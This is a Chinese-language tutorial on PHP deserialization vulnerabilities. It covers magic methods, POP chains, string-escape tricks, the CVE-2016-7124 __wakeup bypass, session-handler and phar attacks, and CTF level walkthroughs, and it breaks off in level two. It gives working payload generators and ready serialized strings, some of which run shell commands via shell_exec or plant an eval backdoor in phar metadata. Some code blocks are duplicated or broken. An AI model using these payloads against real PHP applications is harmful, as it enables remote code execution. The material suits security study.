# PHP反序列化漏洞入门到精通

## 序列化的作用

序列化（Serialization）是将对象的**状态信息**（属性）转换为可以存储或传输的形式的过程

`对象状态 --- 序列化 -- 字符串`

将对象或者数组转换为可 存储/传输 的字符串

在`PHP`中使用函数 `serialize() `来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示

## 表达方式

![image-20230510155106951](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230510155106951.png)

### 数组的表达方式

```php
$a = array(
    "Lili",
    "Tom",
    "Lucy"
);
echo serialize($a).'<br/>';
```

==结果==

```php
# a:3:{i:0;s:4:"Lili";i:1;s:3:"Tom";i:2;s:4:"Lucy";}
# a (array):3 (元素数量个数):{i:0 (元素索引);s (元素类型：string):4 (元素长度):"Lili";i:1;s:3:"Tom";i:2;s:4:"Lucy";}
```



### 类的表达方式

`不能序列化类，只能序列化对象`。只序列化成员对象，不序列化成员```方法

```php
class names{
    public $name = "jack";
    public $age = "18";

    function tell(){
        echo $this->name, $this->age;
    }

}

$baby = new names();
echo serialize($baby).'<br/>';
```

==结果==

````php
# O:5:"names":2:{s:4:"name";s:4:"jack";s:3:"age";s:2:"18";}
# O (object):5 (length):"names":2 (类属性数量):{s (string):4 (length):"name";s:4:"jack";s:3:"age";s:2:"18";}
````

`private`私有属性序列化时，在变量名前加 `%00类名%00`

```php
class names{
    private $name = "jack";
    public $age = "18";

    function tell(){
        echo $this->name, $this->age;
    }

}

$baby = new names();
echo serialize($baby).'<br/>';
```

==结果==

```php
# O:5:"names":2:{s:11:"namesname";s:4:"jack";s:3:"age";s:2:"18";}
# O:5:"names":2:{s:11 ( names(5) + name(4) + 空字符两个(2) = 11):"namesname";s:4:"jack";s:3:"age";s:2:"18";}
```

`protected`受保护属性序列化时，在变量名前加 %00*%00

### 对于类中包含类的表达方式

对于类中包含类的表达方式，被包含的类会被当成类属性放置在外层类中的`{}`中

```php
class test{
    public $name = "jake";
    public function tell(){
        echo $this->name;
    }
}

class test2{
    public $name;
    public function __construct(){
        $this->name = new test();
    }
}

$t = new test2();
echo serialize($t).'<br/>';
```

==结果==

```php
O (Object):5 (str_len):"test2" (class_name):1 (属性数量):{s:4:"name";O:4:"test":1:{s:4:"name";s:4:"jake";}}
```

## 13.2 PHP反序列化基础知识

### 1、PHP反序列化基础知识预备：

1.   反序列化之后的内容为一个对象
2.   反序列化生成的对象里的值，由反序列化里的值提供；于原有类预定于的值无关
3.   反序列化不触发类的成员方法；需要调用方法后才能触发

 

### 2、反序列化作用

将序列化后的参数还原成实例化的对象`字符串 ----反序列化 --- 字符串`



### 代码实战

```php
<?php
class test{
    public $name = 'jack';
    private $age = 18;
    protected $sex = 'Man';

    public function tell(){
        echo $this->name, $this->age, $this->sex;
    }
}

//$t = new test();
//echo serialize($t);
# O:4:"test":3:{s:4:"name";s:4:"jack";s:9:"%00test%00age";i:18;s:6:"%00*%00sex";s:3:"Man";}

# 这里由于 私有化和受保护的 属性都有一个 空 字符不能被打印（空 = %00），粘贴出来时一个空格。所以需要将他转换为 %00。再使用URL解码
# 特点二：反序列化里的值可以按照规则修改，不受原类的影响
$d = 'O:4:"test":3:{s:4:"name";s:3:"Tom";s:9:"%00test%00age";i:95;s:6:"%00*%00sex";s:3:"Man";}';
$d = urldecode($d);
# 特点一：反序列化后得到的是一个对象
$d = unserialize($d);
var_dump($d);
# 特点三：反序列化后需要额外调用成员方法才能触发成员方法
$d->tell();
```

==结果==

```php
	class test#1 (3) {
	  public $name =>
	  string(3) "Tom"
	  private $age =>
	  int(95)
	  protected $sex =>
	  string(3) "Man"
	}
	Tom95Man
```

## 13.3 魔术方法简介

### 什么是魔术方法

一个预定义好的，在特定情况下自动触发的行为方法

 

### 魔术方法的作用

魔术方法在特定条件下自动调用相关方法，最终导致触发代码

 

### PHP 魔术方法一览

![image-20230510155849014](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230510155849014.png)

## 13.4 构造方法和析构方法

### 构造方法 

`__construct`：相当于 Python 中的 `__init__` 方法，在对象被创建的时候自动触发

### 析构方法 

`__destruct`：在对象被销毁的时候自动触发

 

### 代码实战

从下面代码可以看出。对象 `u` 在**实例化**的时候会触发一次 `构造方法`，之后在 **序列化**的时候触发一次 `析构方法`。对象 u 在做**反序列化**的时候在触发一次`析构方法`

```php
<?php
class User{
    public function __construct()
    {
        echo "触发了构造方法"."<br/>";
    }

    public function __destruct()
    {
        // TODO: Implement __destruct() method.
        echo "触发了析构方法"."<br/>";
    }
}

$u = new User();
$u = serialize($u);
echo "----------------------------";
$d = unserialize($u);
```

==结果==

```php
触发了构造方法<br/>触发了析构方法<br/>----------------------------触发了析构方法<br/>
```

## 13.5 weekup和sleep介绍

### `__sleep()`

序列化`serialize()`函数会检查类中是否存在一个魔术方法`__sleep()`。如果存在会**先被调用**，然后*才执行序列化操作*；通常被用于做*防御非法反序列化*操作

触发时机：**序列化** **serialize()** **之前**

功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性

参数：成员属性

返回值：需要被序列化存储的成员属性



### `__wakeup()`

`unserialize()`会检查是否存在一个`__wakeup()`方法。如果存在，则会先调用`__wakeup()`方法，预先准备对象需要的资源

触发时机：**反序列化`unserailaize()`之前**

> `__wakeup() `在反序列化`unserialize()`**之前**
>
> `__destruct()`在反序列化`unseraizlize()`**之后**



 

 ## 13.6 `toString`和`nvoke`

### `__toString()`

触发时机：把`对象`当作`字符串`调用的时候

#### 代码实战

```php
<?php
class Tmp{
    public $name = 'jake';
    public $age = 18;

    public function __toString()
    {
        // TODO: Implement __toString() method.
        return "我是一个类，不是字符串";
    }
}

$t = new Tmp();
echo $t;
```

==输出==

```
我是一个类，不是字符串
```

### __invoke()

触发时机：当一个`类`被当作`函数`调用的时候

#### 代码实战

```php
<?php
class Tmp{
    public $name = 'jake';
    public $age = 18;

    public function __invoke()
    {
        // TODO: Implement __invoke() method.
        echo "我是一个类，不是函数";
    }
}

$t = new Tmp();
echo $t();
```

==输出==

```
我是一个类，不是函数
```

## 13.7 pop链前置知识

### 代码例题

```php
<?php
class index{
    private $test = "test2";
    public function __construct(){
        # 实例化 normal 函数
        $this->test = new normal();
    }
    public function __destruct(){
        # 打印normal字符串
        $this->test->action();
    }
}

class normal{
    public function action(){
        echo "please attack me";
    }
}

class evil{
    var $test2;
    public function action(){
        echo "触发成功！";
        echo shell_exec($this->test2);
    }
}

$test = new index();
echo serialize($test);
# payload 等于 反序列化 字符串
payload = urldecode(payload);
echo @unseralize();
```





### PHP 反序列化`payload`构造

```php
<?php
class index{
    private $test;
    public function __construct(){
        # 实例化 normal 函数
        $this->test = new evil();
    }
    public function __destruct(){
        # 打印normal字符串
        $this->test->action();
    }
}

class evil{
    var $test2 = 'dir';
    public function action(){
        echo "触发成功！";
        echo shell_exec($this->test2);
    }
}

$test = new index();
echo serialize($test);
```

==输出==

```php
O:5:"index":1:{s:11:" index test";O:4:"evil":1:{s:5:"test2";s:3:"dir";}}
```

## 13.8 pop链前置知识2 魔术方法触发规则

> 任务：触发 sec 的 `__toString` 魔术方法

### 源码

```php
<?php
class fast{
    public $source;
    public function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        echo "wakeup is here!!";
        echo $this->source;
    }
}

class sec{
    public $benben;
    public function __toString(){
        return "toString is here";
    }
}

# 任务：触发 sec 的 __toString 方法
```

### PHP 返序列化payload构造

```php
<?php
class fast{
    public $source;
    public function __wakeup()
    {
        // TODO: Implement __wakeup() method.
        echo "wakeup is here!!";
        echo $this->source;
    }
}

class sec{
    public $benben;
    public function __toString(){
        return "toString is here";
    }
}

$f = new fast();
$f->source = new sec();
echo serialize($f);
```

==输出==

```php
O:4:"fast":1:{s:6:"source";O:3:"sec":1:{s:6:"benben";N;}}
```

## 13.9 pop链构造

### 例题源码

```php
<?php
//flag is in flag.php
highlight_file(__FILE__);
error_reporting(0);
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
?>
```

### 例题分析

1. 触发 `Modifer`类的 `__invoke` 魔术方法（将类当成函数调用的时候）
2. 触发 `Test`类的 `__get` 魔术方法（调用类不存在的属性的时候）
3. 触发 `Show`类的 `__toString` 魔术方法（将类直接当成字符串输出的时候）
4. 触发 `Show`类的 `__wakeup` 魔术方法（做反序列化操作的时候），利用 echo 触发`__toString`

### pop链构造源码

```php
<?php
//  flag in flag.php
    class Modifier{
        private $var="flag.php";
    }

    class Show{
        public $source;
        public $str;
        # 当将类当初字符串输出的时候触发 __toString 魔术方法
    }

    class Test{
        public $p;
    }

    $show = new Show();
    $modify = new Modifier();
    $test = new Test();

    $test->p = $modify;
    $show->str = $test;
	# source 必须为 Obj Show
    $show->source = $show;
    echo serialize($show);
```

> ```php
> O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:8:"flag.php";}}}
> ```

### 效果

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230511192850595.png" alt="image-20230511192850595" style="zoom: 50%;" />

## 13.10 字符串逃逸基础

> 在做字符串逃逸的时候，除了需要关注字符串是否被**正确闭合** ，还需要关注修改后的**属性数量是否与序列化字符串中所写的一致**

### 反序列化分隔符

反序列化以`;}`结束，后面的字符串不影响正常的反序列化

### 前置知识

1. 反序列化字符串必须格式保持正常，若**格式错误**，反序列化时会返回`False`

   1. ```php
      <?php
      class A{
          var $v1 = "a";
      }
      
      $a = new A();
      echo serialize($a);
      
      # $b 的反序列化字符串中有两个属性，但是在字符串的属性数量定义时，写的是1，所以返回False
      $b = 'O:1:"A":1:{s:2:"v1";s:1:"a";s:2:"v2";s:4:"test";}';
      var_dump(unserialize($b));
      ```

   2. ==输出==

   3. ```php
      O:1:"A":1:{s:2:"v1";s:1:"a";}D:\PHP\test.php:10:
      bool(false)
      ```

2. 在反序列化的过程中，只要保证反序列化字符串格式的**正确**，那么如果哪怕属性的**数量不同**也可以正常反序列化**（多增少补）**

   1. ```php
      <?php
      class A{
          var $v1 = "a";
          var $v2 = "benben";
      }
      
      $a = new A();
      echo serialize($a);
      
      # $b 的反序列化字符串中，额外定义了一个名为 v3 的属性，但是这个属性是在类中没有的，则直接增加
      $b = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v3";s:4:"test";}';
      var_dump(unserialize($b));
      ```

   2. ==输出==

   3. ```php
      O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";s:6:"benben";}D:\PHP\test.php:12:
      class A#2 (3) {
        public $v1 =>
        string(1) "a"
        public $v2 =>
        string(6) "benben"
        public $v3 =>
        string(4) "test"
      }
      ```

3. 反序列化字符串是以`;}`结尾的，只要保证格式**正确**，那么哪怕后面再**额外添加任何字符串**，都不会对结果造成影响

   1. ```php
      <?php
      class A{
          var $v1 = "a";
          var $v2 = "benben";
      }
      
      $a = new A();
      echo serialize($a);
      
      # 反序列化字符串格式正确闭合，就算后面额外有干扰字符，页不会造成任何影响
      $b = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v3";s:4:"test";}benben666';
      var_dump(unserialize($b));
      ```

   2. ==输出==

   3. ```php
      O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";s:6:"benben";}D:\PHP\test.php:12:
      class A#2 (3) {
        public $v1 =>
        string(1) "a"
        public $v2 =>
        string(6) "benben"
        public $v3 =>
        string(4) "test"
      }
      ```

4. 反序列化字符串中的**特殊符号**是由属性**长度**来确定的      

   1. ```php
      <?php
      class A{
          var $v1 = "a\"";
          var $v2 = "benben";
      }
      
      $a = new A();
      echo serialize($a);
      
      # 在v1的属性名中，添加了转义符号，此时属性长度要改为3
      $b = 'O:1:"A":2:{s:2:"v1";s:3:"a\"";s:2:"v2";s:6:"benben";}';
      var_dump(unserialize($b));
      ```

   2. ==输出==

   3. ```php
      O:1:"A":2:{s:2:"v1";s:2:"a"";s:2:"v2";s:6:"benben";}D:\PHP\test.php:12:
      class A#2 (2) {
        public $v1 =>
        string(3) "a\""
        public $v2 =>
        string(6) "benben"
      }
      ```

      

### 属性逃逸

一般在数据先经过一次`serialize`再经过`unserialize`，在这个中间反序列化的**字符串变**多或者**变少**的时候可能存在反序列化**属性逃逸**

## 13.11 字符串逃逸原理-减少

造成属性逃逸的关键问题是，在序列化完成后，会使用`str_replace`函数对敏感字符进行替换（原字符比替换后的字符多）。以至于**属性长度的字符串**与**替换后属性字符串***_不匹配_*。导致长度过长从而吃掉了后面的功能代码

### 字符串逃逸例题-减少

目标：构造出 `v3 = 123`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '123';

    public function __construct($arga,$argc){
            $this->v1 = $arga;
            $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data = serialize(new A($a,$b));
$data = str_replace("system()","",$data);
var_dump(unserialize($data));
?>
```

### payload构造代码

```php
<?php
class A{
    public $v1 = 'abcsystem()system()';
    public $v2 = ';s:2:"v3";s:3:"123";}';

}
$data = serialize(new A());
echo $data;
# 替换所有符合规则的字符串
$data = str_replace("system()","",$data);
echo $data;
var_dump(unserialize($data));
```

==输出==

分析：由于将两个`system()`进行替换，所有长度19就会吃掉后面的功能代码吗。再利用`v2`去补。来保证格式的正确和构造出`123`

```php
O:1:"A":2:{s:2:"v1";s:19:"abcsystem()system()";s:2:"v2";s:21:";s:2:"v3";s:3:"123";}";}O:1:"A":2:{s:2:"v1";s:19:"abc";s:2:"v2";s:21:";s:2:"v3";s:3:"123";}";}D:\PHP\test.php:12:
class A#1 (3) {
  public $v1 =>
  string(19) "abc";s:2:"v2";s:21:"
  public $v2 =>
  string(21) ";s:2:"v3";s:3:"123";}"
  public $v3 =>
  string(3) "123"
}
```

## 13.12 字符串逃逸原理-增多

字符串逃逸原理：是在进行序列化操作之后，对敏感字符进行替换`（原字符比替换后的字符少）`。从而造成了字符串增多逃逸

### 字符串逃逸例题-增多

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $v1 = 'ls';
    public $v2 = '123';

    public function __construct($arga,$argc){
        $this->v1 = $arga;
        $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data =  serialize(new A($a,$b));
$data = str_replace("ls","pwd",$data);

var_dump(unserialize($data));
```

### payload 构造思路

通过使用`"`闭合前面的字符串，再使用`;}`闭合整条序列化字符串。在中间直接构造自己需要的属性和属性值从而达到逃逸的结果

```php
构造目标：s:2:"v3";s:3:"123
构造闭合：";s:2:"v3";s:3:"123";}
长度计算：";s:2:"v3";s:3:"123";}  = 22

问题：22个字符串构造需要使用多少个`ls`呢？
	方程计算：2x + 22 = 3x
				  x = 22	

最后序列化结果：
O:1:"A":2:{s:2:"v1";s:2:"lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"123";}";s:2:"v2";s:3:"123";}
O:1:"A":2:{s:2:"v1";s:2:"lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"123";}";s:2:"v2";s:3:"123";}

payload：v1=lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"123";}lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"123";}
payload：v2=随意
```

### 效果

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230512181646256.png" alt="image-20230512181646256" style="zoom:50%;" />

## 13.13 字符串逃逸例题-增多

### 例题代码1

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}
$param=$_GET['param'];
$param=serialize(new test($param));
$profile=unserialize(filter($param));

if ($profile->pass=='escaping'){
    echo "Success~";
    echo file_get_contents("flags.php");
}
```

### payload 构造

```php
主要目标是：将 $profile->pass 进行逃逸，使其等于 escaping

filter函数将传入的 flag 或 php 全部替换成 hack
	这里肯定选择使用 php 进行逃逸，因为flag的长度等于hack的长度，是逃逸不了的
	
构造目标：";s:4:"pass";s:8:"escaping";}
长度计算：";s:4:"pass";s:8:"escaping";} = 29

方程计算：3x + 29 = 4x
			  x = 29
即：需要29个php字符串
最后序列化结果：O:4:"test":2:{s:4:"user";s:116:"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}";s:4:"pass";s:8:"daydream";}

payload：phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22;s:4:%22pass%22;s:8:%22escaping%22;}
```



### 例题代码2 - 除不尽

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
            if($this->password==='easy')
            {
                include('flag.php');
                echo $flag;    
            }
            else
            {
                echo 'wrong password';
            }
        }
    }

function filter($string){
    return str_replace('challenge','easychallenge',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```

### payload 构造

在除不尽的情况下，要添加额外字符，且要添加到`;}`后面

```
目标：";s:8:"password";s:4:"easy";} = 29

得方程：9x + 29 = 13x	除不尽

目标添加额外字符：";s:8:"password";s:4:"easy";}aaa = 32
得方程：9x + 32 = 13x
			x  = 8
            
payload：challengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";}aaa
```





## 13.14 字符串逃逸例题

### 例题源码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
    $this->pass=$pass;
    }
}
$param=$_GET['user'];
$pass=$_GET['pass'];
$param=serialize(new test($param,$pass));
$profile=unserialize(filter($param));

if ($profile->vip){
    echo "Success~";
    include_once "flag.php";
}
?>
```

### payload 构造

```php
这题跟上一题一样，为了方便计算还是使用php进行替换

未被替换的序列化字符串：
O:4:"test":3:{s:4:"user";s:54:"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:38:";s:4:"pass";s:4:"pass";s:3:"vip";b:1;}";s:3:"vip";b:0;}

替换后的序列化字符串：
O:4:"test":3:{s:4:"user";s:54:"hkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhk";s:4:"pass";s:38:";s:4:"pass";s:4:"pass";s:3:"vip";b:1;}";s:3:"vip";b:0;}

要逃逸字符串：";s:4:"pass";s:38: = 18，所以使用18个php进行逃逸。注意属性数量一共有3个。所以 pass 需要写入两个属性

payload：
	user = phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp
	pass = ;s:4:"pass";s:4:"pass";s:3:"vip";b:1;}
	
URL payload:
	?user=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&pass=;s:4:"pass";s:4:"pass";s:3:"vip";b:1;}
```

## 13.15 `__wakeup`魔术方法绕过

> 反序列化漏洞：CVE-2016-7124
>
> PHP5 < 5.6.25
>
> PHP7 < 7.0.10

### 漏洞产生原因

在调用`unserilize()`方法前则先调用`__wakeup`方法，但是序列化字符中表示对象**属性个数**的值大于真是的属性个数时，会跳过`__wakeup()`的执行



### 例题源码

```php
<?php
include 'flag.php';


error_reporting(0);


class Name
{
    private $username = 'admin';
    private $password = 100;

    function __wakeup()
    {
        $this->username = 'guest';
    }

    function __destruct()
    {
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;
            echo "</br>";
            echo "You password is: ";
            echo $this->password;
            echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        } else {
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();


        }
    }
}
$name = new Name();
echo serialize($name);

?>
```

### payload 构造

```php
这里得在 username=admmin 和 password = 100 时才能触发flag。但是 `__wakeup` 方法会在序列化的时候将 username改为guest

<?php
class Name
{
    private $username = 'admin';
    private $password = 100;

}

$name = new Name('admin', 100);
echo serialize($name);
```

==输出==

```php
由于是 private 属性，所以需要使用 %00 来填补空
O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
再通过 修改属性数量 来达到绕过 __wakeup 方法的目的
O:4:"Name":12:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513135934876.png" alt="image-20230513135934876" style="zoom:50%;" />

## 13.16 引用绕过

如下题，要求`secret=enter=*`，但是在`GET`传入的时候，有对`*`进行了实体化，以至于无法使得`enter=*`，此时就可以使用**引用传值**方法。将`enter`指向`secert`内存地址，则可保证两者相同

### 例题源码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    $pass=str_replace('*','\*',$pass);
}

$o = unserialize($pass);

if ($o) {
    $o->secret = "*";
    if ($o->secret === $o->enter)
        echo "Congratulation! Here is my secret: ".$flag;
    else
        echo "Oh no... You can't fool me";
}
else echo "are you trolling?";
?>
```

### payload构造

```php
<?php
include("flag.php");
class just4fun {
    var $enter;
    var $secret;
}

$j = new just4fun();
# 引用传值
$j->enter = &$j->secret;
echo serialize($j);<?php
include("flag.php");
class just4fun {
    var $enter;
    var $secret;
}

$j = new just4fun();
# 引用传值
$j->enter = &$j->secret;
echo serialize($j);
```

==输出==

```
O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
```

## 13.17 session反序列化漏洞介绍

当`session_start()`被调用者或者`php.ini`中`session.auto_start`为1时2，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录

**_漏洞产生：写入格式和读取格式不一致_**

| 处理器                    | 对应的存储格式                                               |
| ------------------------- | ------------------------------------------------------------ |
| php                       | 键名 + 竖线 + 经过 `serialize()`函数序列化处理的值（`benben|s:6:"123456"`） |
| php_serialize(php>=5.5.4) | 经过`serialize()`函数序列化处理的数组                        |
| php_binary                | 键名的长度对应的ASCII字符 + 键名 + 经过`serialize()`函数反序列化处理的值 |

### 例题源码

```php
# cookie提交处
<?php
highlight_file(__FILE__);
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['ben'] = $_GET['a'];
?>

# 漏洞触发处
<?php 
highlight_file(__FILE__);
error_reporting(0);

ini_set('session.serialize_handler','php');
session_start();

class D{
    var $a;
    function __destruct(){
        echo shell_exec($this->a);
        var_dump($this->a);
    }
}
```

### payload 构造

```php
由于cookie提交处页面使用的保存cookie的方式时`php_serialize()`，这种办法是数组的方式保存。但是漏洞触发处页面所以使用的读取办法却是`php`，这种办法使用的是`键名|值`的办法，即直接将`|`后的代码当成值，所以在提交的前面加上`|`即可

<?php
class D{
    var $a = 'dir';
}

echo serialize(new D());
```

==输出==

```php
O:1:"D":1:{s:1:"a";s:3:"dir";}
最终payload：
    a=|O:1:"D":1:{s:1:"a";s:8:"ipconfig";}a=|O:1:"D":1:{s:1:"a";s:8:"ipconfig";}
```

提交后的session：

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513164136800.png" alt="image-20230513164136800" style="zoom:50%;" />

读取的session：

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513164233380.png" alt="image-20230513164233380" style="zoom:50%;" />

## 13.18 session反序列化漏洞例题

### 例题源码

```php
# 漏洞触发处（index.php）
<?php
highlight_file(__FILE__);
/*hint.php*/
session_start();
class Flag{
    public $name;
    public $her;
    function __wakeup(){
        $this->her=md5(rand(1, 10000));
        if ($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}

# session上传处（hint.php）
<?php
highlight_file(__FILE__);
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = $_GET['a'];
?>
```

### payload构造

```php
# 很明显的通过引用传值构造payload，再使用session点上传

<?php
session_start();
class Flag{
    public $name;
    public $her;
}

$f = new Flag();
$f->name = &$f->her;
echo serialize($f);
```

==输出==

```php
O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}
最终payload：
    a=|O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}
```

## 13.19 phar 反序列化漏洞介绍

### 什么是phar

JAR是开发java程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单

`PHAR（”Php ARchive“）`是PHP里类似于JAR的一种**打包文件**

对于`PHP5.3`或更高版本，Phar后缀文件时默认开启支持的，可以直接使用它

`文件包含：phar伪协议，可读取 .phar 文件`

### Phar结构

`stub phar`文件表示：格式为`xxx<?php xxx;__HALLT_COMPiLER();?>`（头部信息）

`manifest` 压缩文件的属性等信息，以**序列化**存储

`contents`压缩文件的内容

`signature`签名，放在文件末尾

`Phar`协议解析文件时，会字段触发`manifest字段`的序列化字符串进行**反序列化**



<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513170943358.png" alt="image-20230513170943358" style="zoom:50%;" />

### Phar漏洞原理

`manifest`压缩文件的属性等信息，以序列化存储；存在一段系列换字符串

调用phar伪协议，可读取`.phhar`文件

Phar协议解析文件时，会自动触发对`manifest`自读那的序列化子字符串进行反序列化

Phar需要`PHP >= 5.2`在php.ini中将`phar. `设为Off（注意去掉前面的分号）

### Phar使用条件

+ `Phar`文件能上传到服务器端
+ 要有可用反序列化的魔术方法作为跳板
+ 要有文件操作函数，如`file_exists()\fopen()\file_get_contents()`
+ 文件操作函数参数可控，且`: / phar`等特殊字符没有被过滤

## 13.20 Phar反序列化漏洞例题

思路：通过构造非法的`Phar`包，并上传到服务器，后利用`__destruct()`魔术方法触发flag

### 例题源码

```php
# 漏洞触发页（index.php）
<?php
highlight_file(__FILE__);
error_reporting(0);
class TestObject {
    public function __destruct() {
		include('flag.php');
        echo $flag;
    }
}
$filename = $_POST['file'];
if (isset($filename)){
	echo md5_file($filename);
}
//upload.php
?>

# 文件上传页（upload.php）
<!DOCTYPE html>
<head>
    <meta charset="UTF-8"> 
    <title>上传图片文件</title>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
        <input type="file" name="file" id="file">
        <input type="submit" name="submit" id="上传">
</form>
</body>
</html>
<?php
error_reporting(0);
$allowedExs=array("gif","jpeg","jpg","png");
$temp=explode(".",$_FILES["file"]["name"]);
$extension=end($temp);
if (($_FILES["file"]["type"])=="image/gif"
    ||($_FILES["file"]["type"])=="image/jpeg"
    ||($_FILES["file"]["type"])=="image/jpg"
    ||($_FILES["file"]["type"])=="image/pjpeg"
    ||($_FILES["file"]["type"])=="image/x-png"
    ||($_FILES["file"]["type"])=="image/png"
    &&($_FILES["file"]["size"])<204800
    &&in_array($extension,$allowedExs)){
    if($_FILES["file"]["error"]>0){
        echo "错误：".$_FILES["file"]["error"]."<br/>";
    }
    else{
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload/".$_FILES["file"]["name"]);
        echo "文件储存在"."upload/".$_FILES["file"]["name"];
        }
    }
else{
    echo "mybe hack?";
}
```

### Phar包构造源码

```php
# 这里只需要成功实例化 TestObject类 即可
<?php
//highlight_file(__FILE__);
class TestObject {
}

@unlink('test.phar');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new TestObject();
$o->output='eval($_GET["a"]);';
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
```

### 实战过程

成功构造`Phar`包后上传到服务器，再在`index.php`页面利用`Phar`伪协议访问包

<img src="PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20230513201238477.png" alt="image-20230513201238477" style="zoom:50%;" />

# PHP序列化漏洞闯关

关卡源码下载地址：

```
https://github.com/fine-1/php-SER-libs
```

## 第一关

分析：源码上`class a`已经自己调用了`action`方法，所以只需要做实例化就行了

```php
<?php
highlight_file(__FILE__);
class a{
    var $act;
    function action(){
        eval($this->act);
    }
}
$a=unserialize($_GET['flag']);
$a->action();
?>
<br><a href="../level2">点击进入第二关</a>
```

wp：

```php
<?php

class a{
    var $act;
    function action(){
        eval($this->act);
    }
}
$a = new a();
echo serialize($a)

?>
```

## 第二关

分析：实例化`mylogin`类之后，自动调用`login方法`，只要`login方法`返回1，就能通关；

```php
<?php
highlight_file(__FILE__);
include("flag.php");
class mylogin{
    var $user;
    var $pass;
